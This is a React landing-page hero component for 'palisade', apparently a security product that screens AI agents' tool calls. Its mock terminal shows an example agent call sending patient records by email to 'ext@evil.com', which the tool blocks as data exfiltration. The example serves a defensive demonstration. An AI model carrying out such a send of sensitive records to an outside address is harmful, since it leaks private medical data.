"use client";

import { motion } from "framer-motion";

export function Hero() {
  return (
    <section className="relative pt-36 pb-24 px-6">
      <div className="mx-auto max-w-3xl text-center">
        {/* Badge */}
        <motion.div
          initial={{ opacity: 0, y: 16 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.05 }}
        >
          <span className="inline-flex items-center gap-2 rounded-full border border-[#e5e5e5] bg-[#fafafa] px-3.5 py-1 text-[12px] font-medium text-[#737373]">
            <span className="h-1.5 w-1.5 rounded-full bg-[#16a34a] animate-pulse" />
            Now with OpenClaw integration
          </span>
        </motion.div>

        {/* Headline */}
        <motion.h1
          initial={{ opacity: 0, y: 24 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.12, ease: [0.25, 0.1, 0.25, 1] }}
          className="mt-7 text-[clamp(2.25rem,5vw,3.5rem)] font-semibold leading-[1.1] tracking-tight text-[#0a0a0a]"
        >
          Runtime intelligence
          <br />
          for AI agents
        </motion.h1>

        {/* Sub */}
        <motion.p
          initial={{ opacity: 0, y: 16 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.22 }}
          className="mt-5 text-[17px] leading-relaxed text-[#737373] max-w-xl mx-auto"
        >
          The security layer between AI agents and the real world. Risk-scored
          decisions, exfiltration detection, and a real-time audit trail for
          every tool call.
        </motion.p>

        {/* CTAs */}
        <motion.div
          initial={{ opacity: 0, y: 12 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.32 }}
          className="mt-9 flex items-center justify-center gap-3"
        >
          <a
            href="#waitlist"
            className="rounded-full bg-[#0a0a0a] px-6 py-2.5 text-[14px] font-medium text-white transition-opacity hover:opacity-80"
          >
            Get Early Access
          </a>
          <a
            href="#docs"
            className="rounded-full border border-[#e5e5e5] bg-white px-6 py-2.5 text-[14px] font-medium text-[#0a0a0a] transition-colors hover:bg-[#fafafa]"
          >
            Documentation
          </a>
        </motion.div>
      </div>

      {/* Terminal */}
      <motion.div
        initial={{ opacity: 0, y: 32 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.7, delay: 0.45, ease: [0.25, 0.1, 0.25, 1] }}
        className="mx-auto mt-16 max-w-2xl"
      >
        <div className="overflow-hidden rounded-xl border border-[#e5e5e5] shadow-sm">
          {/* Title bar */}
          <div className="flex items-center gap-2 border-b border-[#e5e5e5] bg-[#fafafa] px-4 py-2.5">
            <div className="flex gap-1.5">
              <span className="h-3 w-3 rounded-full bg-[#ff5f57]" />
              <span className="h-3 w-3 rounded-full bg-[#febc2e]" />
              <span className="h-3 w-3 rounded-full bg-[#28c840]" />
            </div>
            <span className="ml-2 text-[11px] font-mono text-[#a3a3a3]">
              palisade &mdash; policy evaluation
            </span>
          </div>
          {/* Content */}
          <div className="bg-white p-5 font-mono text-[13px] leading-[1.7] text-left space-y-1.5">
            <p className="text-[#a3a3a3]"># Agent tries to exfiltrate medical data</p>
            <p>
              <span className="text-[#16a34a]">$</span>{" "}
              <span className="text-[#0a0a0a]">palisade evaluate</span>{" "}
              <span className="text-[#737373]">--tool send_email</span>
            </p>
            <p className="text-[#a3a3a3] pl-4">
              {`--args '{"to":"ext@evil.com","body":"<patient_records>"}'`}
            </p>
            <div className="mt-3 rounded-lg border border-[#fee2e2] bg-[#fef2f2] px-4 py-3 space-y-1">
              <p className="flex items-center gap-2">
                <span className="inline-flex h-5 items-center rounded bg-[#dc2626] px-1.5 text-[11px] font-semibold text-white">
                  BLOCK
                </span>
                <span className="text-[#0a0a0a]">risk score: 60</span>
              </p>
              <p className="text-[#737373] text-[12px]">
                Data exfiltration: sensitive data (medical) + external system (send_email)
              </p>
              <p className="text-[#a3a3a3] text-[11px]">
                Rules: touchesSensitiveData(30) + affectsExternalSystem(30)
              </p>
            </div>
          </div>
        </div>
      </motion.div>
    </section>
  );
}
